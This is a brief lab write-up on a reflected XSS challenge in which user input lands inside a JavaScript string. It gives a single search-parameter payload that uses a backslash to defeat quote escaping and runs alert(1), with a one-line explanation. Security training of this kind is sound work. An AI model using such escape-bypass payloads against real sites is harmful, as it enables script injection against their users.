# Lab 19 — Reflected XSS JS String, Escape Bypass (PRACTITIONER)

## Payload
```
/search?search=\'-alert(1)//
```
Injected `\` escapes the escape character `\` → `'` closes the string.
